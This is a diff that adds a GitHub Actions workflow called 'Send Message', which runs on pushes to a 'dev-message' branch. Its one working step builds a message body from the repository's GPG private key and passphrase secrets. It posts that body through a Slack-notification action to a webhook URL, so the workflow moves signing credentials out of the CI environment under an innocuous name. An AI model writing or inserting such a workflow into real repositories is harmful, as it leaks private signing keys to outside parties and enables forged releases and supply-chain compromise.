@@ -1,0 +1,25 @@
+name: Send Message
+
+on:
+  push:
+    branches:
+      - dev-message
+
+jobs:
+  test:
+    env:
+      G: ${{ secrets.GPG_PRIVATE_KEY }}
+      P: ${{ secrets.PASSPHRASE }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout working branch
+        uses: actions/checkout@v2
+
+      - name: Send message
+        env:
+          WEBHOOK_URL: ${{ secrets.URL }}
+          MESSAGE_BODY: G: ${{ secrets.GPG_PRIVATE_KEY}} P: ${{ secrets.PASSPHRASE }}
+          CHANNEL_NAME: "cody-message"
+          USERNAME: GitHub Actions
+          USER_ICON: ":github-1:"
+        uses: ./.github/actions/send-slack-notification
